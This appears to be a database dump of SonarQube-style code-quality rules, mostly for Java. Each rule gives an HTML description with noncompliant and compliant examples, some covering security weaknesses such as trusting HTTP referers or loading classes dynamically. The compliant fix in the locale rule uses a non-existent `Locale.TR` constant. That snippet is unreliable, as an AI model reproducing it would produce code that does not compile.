408	Locale should be used in String operations	S1449	S1449	squid	<p>Failure to specify a locale when calling the methods <code>toLowerCase()</code> or <code>toUpperCase()</code> on <code>String</code> objects means the system default encoding will be used, possibly creating problems with international characters. For instance with the Turkish language, when converting the small letter i to upper case, the result is capital letter I with a dot over it.</p>\n<p>Case conversion without a locale may work fine in its "home" environment, but break in ways that are extremely difficult to diagnose for customers who use different encodings. Such bugs can be nearly, if not completely, impossible to reproduce when it's time to fix them.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nmyString.toLowerCase()\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nmyString.toLowerCase(Locale.TR)\n</pre>\n\n<h2>See</h2>\n<ul>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/EwAiAg">CERT, STR02-J.</a> - Specify an appropriate locale when comparing locale-dependent data\n</li></ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,unpredictable	f	HTML	1511453806899	1511453806899	1
401	Resources should be closed	S2095	S2095	squid	<p>Java's garbage collection cannot be relied on to clean up everything. Specifically, connections, streams, files and other classes that implement the <code>Closeable</code> interface or it's super-interface, <code>AutoCloseable</code>, must be manually closed after creation. Failure to do so will result in a resource leak which could bring first the application and then perhaps the box it's on to their knees.</p>\n\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nOutputStream stream = null;\ntry{\n  for (String property : propertyList) {\n    stream = new FileOutputStream("myfile.txt");  // Noncompliant\n    // ...\n  }\n}catch(Exception e){\n  // ...\n}finally{\n  stream.close();  // Multiple streams were opened. Only the last is closed.\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nOutputStream stream = null;\ntry{\n  stream = new FileOutputStream("myfile.txt");\n  for (String property : propertyList) {\n    // ...\n  }\n}catch(Exception e){\n  // ...\n}finally{\n  stream.close();\n}\n</pre>\n\n<h2>Exceptions</h2>\n\n<p>Java 7 introduced the try-with-resources statement, which implicitly closes <code>Closeables</code>. All resources opened in a try-with-resources statement are ignored by this rule.</p>\n\n<pre>\ntry (BufferedReader br = new BufferedReader(new FileReader(fileName))) {\n  //...\n}\ncatch ( ... ) {\n  //...\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n  <li><a href="http://cwe.mitre.org/data/definitions/459.html">MITRE, CWE-459</a> - Incomplete Cleanup</li>\n  <li><a href="https://www.securecoding.cert.org/confluence/x/9gFqAQ">CERT, FIO04-J</a> - Release resources when they are no longer needed</li>\n</ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cert,cwe,denial-of-service,leak	f	HTML	1511453806867	1511453806867	2
402	Classes should not be empty	S2094	S2094	squid	<p>There is no good excuse for an empty class. If it's being used simply as a common extension point, it should be replaced with an <code>interface</code>. If it was stubbed in as a placeholder for future development it should be fleshed-out. In any other case, it should be eliminated.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Nothing {  // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic interface Nothing {\n}\n</pre>\n\n<h2>Exceptions</h2>\n\n<p>Empty classes can be used as marker types (for spring for instance), therefore annotated empty classes won't raise any issue.</p>\n<pre>\n@Configuration\n@EnableWebMvc\npublic class ApplicationConfiguration {\n\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	clumsy	f	HTML	1511453806872	1511453806872	1
403	"equals(Object obj)" should test argument type	S2097	S2097	squid	<p>Because the <code>equals</code> method takes a generic <code>Object</code> as a parameter, any type of object may be passed to it. The method should not assume it will only be used to test objects of its class type. It must instead check the parameter's type.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic boolean equals(Object obj) {\n  MyClass mc = (MyClass)obj;  // Noncompliant\n  // ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic boolean equals(Object obj) {\n  if (obj == null)\n    return false;\n\n  if (this.getClass() != obj.getClass())\n    return false;\n\n  MyClass mc = (MyClass)obj;\n  // ...\n}\n</pre>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806875	1511453806876	2
404	"main" should not "throw" anything	S2096	S2096	squid	<p>There's no reason for a <code>main</code> method to <code>throw</code> anything. After all, what's going to catch it? </p>\n<p>Instead, the method should itself gracefully handle any exceptions that may bubble up to it, attach as much contextual information as possible, and perform whatever logging or user communication is necessary, and <code>exit</code> with non-zero (i.e. non-success) exit code if necessary.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic static void main(String args[]) throws Exception { // Noncompliant\n  doSomething();\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic static void main(String args[]) {\n try {\n    doSomething();\n  } catch (Throwable t) {\n    log.error(t);\n    System.exit(1);  // Default exit code, 0, indicates success. Non-zero value means failure.\n  }\n}\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	error-handling	f	HTML	1511453806879	1511453806879	3
405	"equals(Object obj)" and "hashCode()" should be overridden in pairs	S1206	S1206	squid	<p>According to the Java Language Specification, there is a contract between <code>equals(Object)</code> and <code>hashCode()</code>:</p>\n<blockquote>\n<p>If two objects are equal according to the <code>equals(Object)</code> method, then calling the <code>hashCode</code> method on each of the two objects must produce the same integer result. </p>\n<p>It is not required that if two objects are unequal according to the <code>equals(java.lang.Object)</code> method, then calling the <code>hashCode</code> method on each of the two objects must produce distinct integer results.</p>\n<p>However, the programmer should be aware that producing distinct integer results for unequal objects may improve the performance of hashtables.</p>\n</blockquote>\n<p>In order to comply with this contract, those methods should be either both inherited, or both overridden.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nclass MyClass {    // Noncompliant - should also override "hashCode()"\n\n  @Override\n  public boolean equals(Object obj) {\n    /* ... */\n  }\n\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nclass MyClass {    // Compliant\n\n  @Override\n  public boolean equals(Object obj) {\n    /* ... */\n  }\n\n  @Override\n  public int hashCode() {\n    /* ... */\n  }\n\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/581.html">MITRE, CWE-581</a> - Object Model Violation: Just One of Equals and Hashcode Defined</li>\n<li> CERT Java Secure Coding, MET09-J - Classes that define an equals() method must also define a hashCode() method</li>\n</ul>	4	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	cert,cwe	f	HTML	1511453806882	1511453806883	2
406	Classes should not have too many methods	S1448	S1448	squid	<p>\n  A class that grows too much tends to aggregate too many responsibilities\n  and inevitably becomes harder to understand and therefore to maintain.\n  Above a specific threshold, it is strongly advised to refactor the class\n  into smaller ones which focus on well defined topics.\n</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1h	\N	\N	brain-overload	f	HTML	1511453806886	1511453806886	1
407	Classes should not be loaded dynamically	S2658	S2658	squid	<p>\n  Dynamically loaded classes could contain malicious code executed by a static class initializer.\n  I.E. you wouldn't even have to instantiate or explicitly invoke methods on such classes to be vulnerable to an attack.\n</p>\n\n<p>This rule raises an issue for each use of dynamic class loading.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nString className = System.getProperty("messageClassName");\nClass clazz = Class.forName(className);  // Noncompliant\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="http://cwe.mitre.org/data/definitions/545.html">MITRE, CWE-545</a> - Use of Dynamic Class Loading</li>\n  <li><a href="https://www.owasp.org/index.php/Top_10_2013-A1-Injection">OWASP Top 10 2013 Category A1</a> - Injection</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	45min	\N	\N	cwe,owasp-a1	f	HTML	1511453806896	1511453806896	3
911	"FIXME" tags should be handled	S1134	\N	javascript	<p>\n  <code>FIXME</code> tags are commonly used to mark places where a bug is suspected, but which the developer wants to deal with later.\n</p>\n<p>\n  Sometimes the developer will not have the time or will simply forget to get back to that tag.\n  This rule is meant to track those tags, and ensure that they do not go unnoticed.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction divide(numerator, denominator) {\n  return numerator / denominator;              // FIXME denominator value might be  0\n}\n</pre>	2	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	\N	f	HTML	1511453807523	1511453807523	1
912	"TODO" tags should be handled	S1135	\N	javascript	<p>\n  <code>TODO</code> tags are commonly used to mark places where some more code is required, but which the developer wants to implement later.\n</p>\n<p>\n  Sometimes the developer will not have the time or will simply forget to get back to that tag.\n  This rule is meant to track those tags, and ensure that they do not go unnoticed.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfunction doSomething() {\n  // TODO\n}\n</pre>	0	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	\N	f	HTML	1511453807524	1511453807524	1
913	Files should contain an empty new line at the end	MissingNewlineAtEndOfFile	\N	javascript	<p>Some tools such as Git work better when files end with an empty line.</p>\n<p>This rule simply generates an issue if it is missing.</p>\n<p>For example, a Git diff look like:</p>\n<pre>\n+class Test {\n+}\n\\ No newline at end of file\n</pre>\n<p>if the empty line is missing at the end of the file.</p>	1	\N	READY	js	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807525	1511453807525	1
409	"enum" fields should not be publicly mutable	S3066	S3066	squid	<p><code>enum</code>s are generally thought of as constant, but an <code>enum</code> with a <code>public</code> field or <code>public</code> setter is not only non-constant, but also vulnerable to malicious code. Ideally fields in an <code>enum</code> are <code>private</code> and set in the constructor, but if that's not possible, their visibility should be reduced as much as possible.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic enum Continent {\n\n  NORTH_AMERICA (23, 24709000),\n  // ...\n  EUROPE (50, 39310000);\n\n  public int countryCount;  // Noncompliant\n  private int landMass;\n\n  Continent(int countryCount, int landMass) { \n    // ...\n  }\n\n  public void setLandMass(int landMass) {  // Noncompliant\n    this.landMass = landMass;\n  }\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic enum Continent {\n\n  NORTH_AMERICA (23, 24709000),\n  // ...\n  EUROPE (50, 39310000);\n\n  private int countryCount; \n  private int landMass;\n\n  Continent(int countryCount, int landMass) { \n    // ...\n  }\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	bad-practice	f	HTML	1511453806902	1511453806902	3
410	Source code should be indented consistently	IndentationCheck	IndentationCheck	squid	<p>Proper indentation is a simple and effective way to improve the code's readability. Consistent indentation among the developers on a team also reduces the differences that are committed to source control systems, making code reviews easier. </p>\n<p>By default this rule checks that each block of code is indented but not the size of this indent. The parameter "indentSize" allows the expected indent size to be defined. Only the first line of a badly indented section is reported.</p>\n<p>The following code illustrates this rule when the expected indent size is set to 2:</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nclass Foo {\n  public int a; \n   public int b;   // Noncompliant, expected to start at column 4\n\n...\n\n  public void doSomething() {\n    if(something) {\n          doSomethingElse();  // Noncompliant, expected to start at column 6\n  }   // Noncompliant, expected to start at column 4\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nclass Foo {\n  public int a; \n  public int b; \n\n...\n\n  public void doSomething() {\n    if(something) {\n        doSomethingElse();\n    } \n  }\n}\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453806903	1511453806903	1
411	Classes should not be coupled to too many other classes (Single Responsibility Principle)	S1200	S1200	squid	<p>\n  According to the Single Responsibility Principle, introduced by Robert C. Martin in his book "Principles of Object Oriented Design", a class should have only one responsibility:\n</p>\n\n<blockquote>\nIf a class has more than one responsibility, then the responsibilities become coupled.\nChanges to one responsibility may impair or inhibit the class' ability to meet the others.\nThis kind of coupling leads to fragile designs that break in unexpected ways when changed.\n</blockquote>\n\n<p>\n  Classes which rely on many other classes tend to aggregate too many responsibilities and should be split into several smaller ones.\n</p>\n<p>\n  Nested classes dependencies are not counted as dependencies of the outer class.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<p>With a threshold of 5:</p>\n<pre>\nclass Foo {                        // Noncompliant - Foo depends on too many classes: T1, T2, T3, T4, T5, T6 and T7\n  T1 a1;                           // Foo is coupled to T1\n  T2 a2;                           // Foo is coupled to T2\n  T3 a3;                           // Foo is coupled to T3\n\n  public T4 compute(T5 a, T6 b) {  // Foo is coupled to T4, T5 and T6\n    T7 result = a.getResult(b);    // Foo is coupled to T7\n    return result;\n  }\n\n  public static class Bar {        // Compliant - Bar depends on 2 classes: T8 and T9\n    T8 a8;\n    T9 a9;\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2h	\N	\N	brain-overload	f	HTML	1511453806907	1511453806907	1
412	Web applications should not have a "main" method	S2653	S2653	squid	<p>\n  There is no reason to have a <code>main</code> method in a web application.\n  It may have been useful for debugging during application development,\n  but such a method should never make it into production.\n  Having a <code>main</code> method in a web application opens a door to the application logic\n  that an attacker may never be able to reach (but watch out if one does!),\n  but it is a sloppy practice and indicates that other problems may be present.\n</p>\n<p>\n  This rule raises an issue when a <code>main</code> method is found in a servlet or an EJB.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyServlet extends HttpServlet {\n  public void doGet(HttpServletRequest req, HttpServletResponse res) throws ServletException, IOException {\n    if (userIsAuthorized(req)) {\n      updatePrices(req);\n    }\n  }\n\n  public static void main(String[] args) { // Noncompliant\n    updatePrices(req);\n  }\n}\n</pre>\n\n<h2>See</h2>\n<ul>\n  <li><a href="http://cwe.mitre.org/data/definitions/489.html">MITRE, CWE-489</a> - Leftover Debug Code</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	cwe,jee	f	HTML	1511453806910	1511453806911	3
413	Methods named "equals" should override Object.equals(Object)	S1201	S1201	squid	<p>"equals" as a method name should be used exclusively to override <code>Object.equals(Object)</code> to prevent any confusion.</p>\n<p>It is tempting to overload the method to take a specific class instead of <code>Object</code> as parameter, to save the class comparison check. However, this will not work as expected.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nclass MyClass {\n  private int foo = 1;\n\n  public boolean equals(MyClass o) {                    // Noncompliant - "equals" method which does not override Object.equals(Object)\n    return o != null &amp;&amp; o.foo == this.foo;\n  }\n\n  public static void main(String[] args) {\n    MyClass o1 = new MyClass();\n    Object o2 = new MyClass();\n    System.out.println(o1.equals(o2));                  // Will display "false" because "o2" is of type "Object" and not "MyClass"\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nclass MyClass {\n  private int foo = 1;\n\n  @Override\n  public boolean equals(Object o) {                     // Compliant - overrides Object.equals(Object)\n    if (o == null || !(o instanceof MyClass)) {\n      return false;\n    }\n\n    MyClass other = (MyClass)o;\n    return this.foo == other.foo;\n  }\n\n  /* ... */\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	suspicious	f	HTML	1511453806912	1511453806912	1
414	"public static" fields should be constant	S1444	S1444	squid	<p>There is no good reason to declare a field "public" and "static" without also declaring it "final". Most of the time this is a kludge to share a state among several objects. But with this approach, any object can do whatever it wants with the shared state, such as setting it to <code>null</code>. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Greeter {\n  public static Foo foo = new Foo();\n  ...\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Greeter {\n  public static final Foo FOO = new Foo();\n  ...\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/500.html">MITRE, CWE-500</a> - Public Static Field Not Marked Final</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/QQBqAQ">CERT OBJ10-J</a> - Do not use public static nonfinal variables</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cert,cwe	f	HTML	1511453806913	1511453806913	3
571	An open curly brace should be located at the end of a line	LeftCurlyBraceEndLineCheck	LeftCurlyBraceEndLineCheck	squid	<p>Sharing some coding conventions is a key point to make it possible for a team to efficiently collaborate. This rule make it mandatory to place open curly braces at the end of lines of code.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nif(condition)\n{\n  doSomething();\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nif(condition) {\n  doSomething();\n}\n</pre>\n<h2>Exceptions</h2>\n\n<p>When blocks are inlined (left and right curly braces on the same line), no issue is triggered. </p>\n<pre>\nif(condition) {doSomething();} \n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453807102	1511453807102	1
417	Relational operators should be used in "for" loop termination conditions	S888	S888	squid	<p>Testing <code>for</code> loop termination using an equality operator (<code>==</code> and <code>!=</code>) is dangerous, because it could set up an infinite loop. Using a broader relational operator instead casts a wider net, and makes it harder (but not impossible) to accidentally write an infinite loop.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nfor (int i = 1; i != 10; i += 2)  // Noncompliant. Infinite; i goes from 9 straight to 11.\n{\n  //...\n} \n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nfor (int i = 1; i &lt;= 10; i += 2)  // Compliant\n{\n  //...\n} \n</pre>\n<h2>Exceptions</h2>\n\n<p>Equality operators are ignored if the loop counter is not modified within the body of the loop and either:</p>\n<ul>\n<li> starts below the ending value and is incremented by 1 on each iteration.</li>\n<li> starts above the ending value and is decremented by 1 on each iteration.</li>\n</ul>\n<p>Equality operators are also ignored when the test is against <code>null</code>.</p>\n<pre>\nfor (int i = 0; arr[i] != null; i++) {\n  // ...\n}\n\nfor (int i = 0; (item = arr[i]) != null; i++) {\n  // ...\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> MISRA C++:2008, 6-5-2</li>\n<li> <a href="http://cwe.mitre.org/data/definitions/835">MITRE, CWE-835</a> - Loop with Unreachable Exit Condition ('Infinite Loop')</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/EwDJAQ">CERT, MSC21-C</a> - Use robust loop termination conditions</li>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/GwDJAQ">CERT, MSC21-CPP</a> - Use inequality to terminate a loop whose counter changes by more than one</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,cwe,misra	f	HTML	1511453806915	1511453806916	2
418	Fields should not be initialized to default values	S3052	S3052	squid	<p>\n  The compiler automatically initializes class fields to their default values before setting them with any initialization values,\n  so there is no need to explicitly set a field to its default value. Further, under the logic that cleaner code is better code,\n  it's considered poor style to do so.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n\n  int count = 0;  // Noncompliant\n  // ...\n\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n\n  int count;\n  // ...\n\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p><code>final</code> fields are ignored.</p>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	convention	f	HTML	1511453806916	1511453806917	1
419	Inheritance tree of classes should not be too deep	MaximumInheritanceDepth	MaximumInheritanceDepth	squid	<p>Inheritance is certainly one of the most valuable concepts in object-oriented programming.</p>\n<p>It's a way to compartmentalize and reuse code by creating collections of attributes and behaviors called classes which can be based on previously created classes.</p>\n<p>But abusing of this concept by creating a deep inheritance tree can lead to very complex and unmaintainable source code.</p>\n<p>Most of the time a too deep inheritance tree is due to bad object oriented design which has led to systematically use 'inheritance' when 'composition' would suit better.</p>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	4h	\N	\N	design	f	HTML	1511453806917	1511453806917	1
424	Declarations should use Java collection interfaces such as "List" rather than specific implementation classes such as "LinkedList"	S1319	S1319	squid	<p>The purpose of the Java Collections API is to provide a well defined hierarchy of interfaces in order to hide implementation details.</p>\n<p>Implementing classes must be used to instantiate new collections, but the result of an instantiation should ideally be stored in a variable whose type is a Java Collection interface.</p>\n<p>This rule raises an issue when an implementation class:</p>\n<ul>\n<li> is returned from a <code>public</code> method.</li>\n<li> is accepted as an argument to a <code>public</code> method.</li>\n<li> is exposed as a <code>public</code> member.</li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class Employees {\n  private HashSet&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();  // Noncompliant - "employees" should have type "Set" rather than "HashSet"\n\n  public HashSet&lt;Employee&gt; getEmployees() {                       // Noncompliant\n    return employees;\n  }\n}\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\npublic class Employees {\n  private Set&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;();      // Compliant\n\n  public Set&lt;Employee&gt; getEmployees() {                           // Compliant\n    return employees;\n  }\n}\n</pre>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	bad-practice	f	HTML	1511453806925	1511453806926	1
425	HTTP referers should not be relied on	S2089	S2089	squid	<p>The fields in an HTTP request are putty in the hands of an attacker, and you cannot rely on them to tell you the truth about anything. While it may be safe to store such values after they have been neutralized, decisions should never be made based on their contents.</p>\n<p>This rule flags uses of the referer header field.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class MyServlet extends HttpServlet {\n  protected void doPost(HttpServletRequest request, HttpServletResponse response) \n        throws ServletException, IOException {\n    String referer = request.getHeader("referer");  // Noncompliant\n    if(isTrustedReferer(referer)){\n      //..\n    }\n    //...\n  }\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="http://cwe.mitre.org/data/definitions/807">MITRE, CWE-807</a> - Reliance on Untrusted Inputs in a Security Decision\n</li><li> <a href="http://cwe.mitre.org/data/definitions/293">MITRE, CWE-293</a> - Using Referer Field for Authentication\n</li><li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses\n</li><li> <a href="https://www.owasp.org/index.php/Top_10_2013-A2-Broken_Authentication_and_Session_Management">OWASP Top Ten 2013 Category A2</a> - Broken Authentication and Session Management\n</li></ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cwe,owasp-a2,sans-top25-porous	f	HTML	1511453806926	1511453806927	3
426	"NOPMD" suppression comments should not be used	S1310	S1310	squid	<p>This rule allows you to track the use of the PMD suppression comment mechanism. </p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\n// NOPMD\n</pre>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	bad-practice	f	HTML	1511453806927	1511453806928	1
427	Loggers should be "private static final" and should share a naming convention	S1312	S1312	squid	<p>Loggers should:</p>\n<ul>\n  <li><code>private</code>: never be accessible outside of its parent class. If another class needs to log something, it should instantiate its own logger.</li>\n  <li><code>static</code>: not be dependent on an instance of a class (an object). When logging something, contextual information can of course be provided in the messages but the logger should be created at class level to prevent creating a logger along with each object.</li>\n  <li><code>final</code>: be created once and only once per class.</li>\n</ul>\n\n<h2>Noncompliant Code Example</h2>\n<p>With a default regular expression of <code>LOG(?:GER)?</code>:</p>\n<pre>\npublic Logger logger = LoggerFactory.getLogger(Foo.class);  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nprivate static final Logger LOGGER = LoggerFactory.getLogger(Foo.class);\n</pre>\n\n<h2>Exceptions</h2>\n<p>Variables of type <code>org.apache.maven.plugin.logging.Log</code> are ignored.</p>	1	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	convention	f	HTML	1511453806928	1511453806928	1
428	IP addresses should not be hardcoded	S1313	S1313	squid	<p>Hardcoding an IP address into source code is a bad idea for several reasons:</p>\n<ul>\n<li> a recompile is required if the address changes</li>\n<li> it forces the same address to be used in every environment (dev, sys, qa, prod)</li>\n<li> it places the responsibility of setting the value to use in production on the shoulders of the developer</li>\n<li> it allows attackers to decompile the code and thereby discover a potentially sensitive address</li>\n</ul>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\nString ip = "127.0.0.1";\nSocket socket = new Socket(ip, 6667);\n</pre>\n<h2>Compliant Solution</h2>\n\n<pre>\nString ip = System.getProperty("myapplication.ip");\nSocket socket = new Socket(ip, 6667);\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> <a href="https://www.securecoding.cert.org/confluence/x/qQCHAQ">CERT, MSC03-J</a> - Never hard code sensitive information</li>\n</ul>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cert	f	HTML	1511453806933	1511453806933	3
429	"Calendars" and "DateFormats" should not be static	S2885	S2885	squid	<p>Not all classes in the standard Java library were written to be thread-safe. Using them in a multi-threaded manner is highly likely to cause data problems or exceptions at runtime.</p>\n<p>This rule raises an issue when an instance of <code>Calendar</code>, <code>DateFormat</code>, <code>javax.xml.xpath.XPath</code>, or <code>javax.xml.validation.SchemaFactory</code> is marked <code>static</code>.</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass {\n  static private SimpleDateFormat format = new SimpleDateFormat("HH-mm-ss");  // Noncompliant\n  static private Calendar calendar = Calendar.getInstance();  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass {\n  private SimpleDateFormat format = new SimpleDateFormat("HH-mm-ss");\n  private Calendar calendar = Calendar.getInstance();\n</pre>	3	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	multi-threading	f	HTML	1511453806934	1511453806934	2
430	Architectural constraints should be followed	ArchitecturalConstraint	ArchitecturalConstraint	squid	<p>A source code comply to an architectural model when it fully\n\tadheres to a set of architectural constraints. A constraint allows to\n\tdeny references between classes by pattern.</p>\n<p>You can for instance use this rule to :</p>\n<ul>\n\t<li>forbid access to **.web.** from **.dao.** classes</li>\n\t<li>forbid access to java.util.Vector, java.util.Hashtable and\n\t\tjava.util.Enumeration from any classes</li>\n\t<li>forbid access to java.sql.** from **.ui.** and **.web.**\n\t\tclasses</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	\N	t	HTML	1511453806934	1511453806934	1
431	The Object.finalize() method should not be overriden	ObjectFinalizeOverridenCheck	ObjectFinalizeOverridenCheck	squid	<p>This Object.finalize() method is called by the garbage collector on an object when garbage collection determines that there are no more references to the object. But there is absolutely no warranty that this method will be called AS SOON AS the last references to the object are removed. It can be few microseconds to few minutes later. So when some system resources need to be disposed by an object, it's better to not rely on this asynchronous mechanism to dispose them.</p>\n<h2>Noncompliant Code Example</h2>\n\n<pre>\npublic class MyClass {\n  ...\n  protected void finalize() {\n    releaseSomeResources();    // Noncompliant\n  }\n  ...\n}\n</pre>\n<h2>See</h2>\n\n<ul>\n<li> CERT Java Secure Coding, MET12-J - Do not use finalizers</li>\n</ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cert,unpredictable	f	HTML	1511453806935	1511453806936	1
432	"for" loop stop conditions should be invariant	ForLoopCounterChangedCheck	ForLoopCounterChangedCheck	squid	<p><code>for</code> loop stop conditions must be invariant (i.e. true at both the beginning and ending of every loop iteration). Ideally, this means that the stop condition is set to a local variable just before the loop begins. </p>\n<p>Stop conditions that are not invariant are difficult to understand and maintain, and will likely lead to the introduction of errors in the future.</p>\n<p>This rule tracks three types of non-invariant stop conditions:</p>\n<ul>\n<li> When the loop counters are updated in the body of the <code>for</code> loop\n</li><li> When the stop condition depend upon a method call\n</li><li> When the stop condition depends on an object property, since such properties could change during the execution of the loop.\n</li></ul>\n\n<h2>Noncompliant Code Example</h2>\n<pre> \nfor (int i = 0; i &lt; 10; i++) {\n  ...\n  i = i - 1; // Noncompliant; counter updated in the body of the loop\n  ...\n} \n</pre>\n\n<h2>Compliant Solution</h2>\n<pre> \nfor (int i = 0; i &lt; 10; i++) {...} \n</pre>\n\n<h2>See</h2>\n<ul>\n<li> MISRA C:2004, 13.6 - Numeric variables being used within a <em>for</em> loop for iteration counting shall not be modified in the body of the loop.\n</li><li> MISRA C++:2008, 6-5-3 - The <em>loop-counter</em> shall not be modified within <em>condition</em> or <em>statement</em>.\n</li></ul>	2	\N	READY	java	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	misra,pitfall	f	HTML	1511453806936	1511453806937	1
